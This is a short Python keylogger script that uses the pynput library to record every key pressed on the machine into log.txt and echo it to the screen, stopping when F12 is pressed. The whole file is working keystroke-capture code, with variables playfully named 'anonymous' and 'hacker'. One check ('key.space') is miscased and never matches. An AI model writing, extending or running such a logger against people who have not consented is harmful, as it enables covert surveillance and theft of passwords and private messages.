from pynput.keyboard import Listener

def anonymous(key):
	key = str(key)
	key = key.replace("'","")
	if key == "Key.f12":
		raise SystemExit(0)
	if key == "Key.enter":
		key = "\n"
	if key == "key.space":
		key = " "
		
	with open("log.txt", "a") as file:
		file.write(key)
	print(key)

with Listener(on_press=anonymous) as hacker:
	hacker.join()